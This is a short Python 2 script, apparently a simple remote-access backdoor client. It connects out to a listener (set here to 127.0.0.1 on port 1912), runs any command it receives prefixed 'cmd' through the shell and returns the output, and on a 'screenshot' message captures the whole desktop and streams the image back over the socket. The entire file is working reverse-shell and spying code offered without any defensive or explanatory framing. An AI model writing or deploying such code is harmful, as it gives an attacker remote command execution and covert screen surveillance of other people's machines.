import socket
import commands
import gtk.gdk


host = '127.0.0.1'
port = 1912

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))

while True:
	data = s.recv(1024)
	print data
	if data[:3] == "cmd":
		cmd = commands.getoutput(data[4:])
		s.send(str(cmd))
	elif data == "screenshot":	
		w = gtk.gdk.get_default_root_window()
		sz = w.get_size()
		pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
		pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
		if (pb != None):
		    pb.save("print.png", "png")
		    f = open("print.png", "rb")
		    l = f.read(1024) 
		    while l:
			    print 'Sending...'
			    s.send(str(l))
			    l = f.read(1024)
		    f.close()
		    print "Done Sending"
		else:
		    data = "Unable to get the screenshot."
		    s.send(data)
		    pass
	else:
		pass
